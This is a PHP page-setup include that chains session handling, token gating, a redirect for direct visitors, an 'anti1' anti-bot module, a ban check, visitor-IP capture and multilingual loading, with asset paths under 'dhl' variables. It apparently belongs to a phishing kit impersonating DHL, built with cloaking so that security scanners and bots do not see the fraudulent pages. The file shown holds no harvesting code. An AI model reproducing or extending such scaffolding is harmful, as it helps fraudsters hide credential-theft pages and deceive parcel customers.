<?php
// COMMON PAGE SETUP
ob_start();
session_start();

// Load config (needed for constants)
require_once(__DIR__ . '/../config.php');

// Security headers
require_once(__DIR__ . '/security-headers.php');

// Direct access protection (redirect to index if no token)
require_once(__DIR__ . '/redirect-to-start.php');

// Token protection
require_once(__DIR__ . '/token-protection.php');

// Anti-bot protection
require_once(__DIR__ . '/../anti1/index.php');
require_once(__DIR__ . '/check-ban.php');

// Get visitor IP
$visitorIP = $_SERVER['REMOTE_ADDR'];

// Language setup
$supportedLanguages = ['en', 'fr', 'es', 'pt', 'de', 'th'];
$defaultLanguage = 'en';
$userLanguage = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2) : 'en';

if (in_array($userLanguage, $supportedLanguages)) {
    $selectedLanguage = $userLanguage;
} else {
    $selectedLanguage = $defaultLanguage;
}

// Load language file
$languageFile = __DIR__ . '/../languages/' . $selectedLanguage . '.php';
if (file_exists($languageFile)) {
    $translations = include($languageFile);
} else {
    die("Language file not found");
}

// Root-relative path to assets (works when app lives under a subfolder, e.g. /dashboard/slm/pages/…)
$scriptName = str_replace('\\', '/', $_SERVER['SCRIPT_NAME'] ?? '');
$scriptDir = dirname($scriptName);
// Under …/pages/*.php → app root is parent; root scripts (e.g. loading.php) → app root is script directory
// (Avoid str_ends_with — requires PHP 8; shared hosting often still runs 7.x.)
$scriptDirNorm = str_replace('\\', '/', $scriptDir);
$scriptDirBase = basename(rtrim($scriptDirNorm, '/'));
$inPagesDir = (substr($scriptDirNorm, -6) === '/pages') || ($scriptDirBase === 'pages');
$dhlWebBase = $inPagesDir ? dirname($scriptDir) : $scriptDir;
$dhlUrlPrefix = '';
if ($dhlWebBase !== '/' && $dhlWebBase !== '\\' && $dhlWebBase !== '.' && $dhlWebBase !== '') {
    $dhlUrlPrefix = rtrim($dhlWebBase, '/');
}
$dhlStyleVer = @filemtime(__DIR__ . '/../assets/style.css') ?: time();
$dhlStyleHref = $dhlUrlPrefix . '/assets/style.css?v=' . $dhlStyleVer;

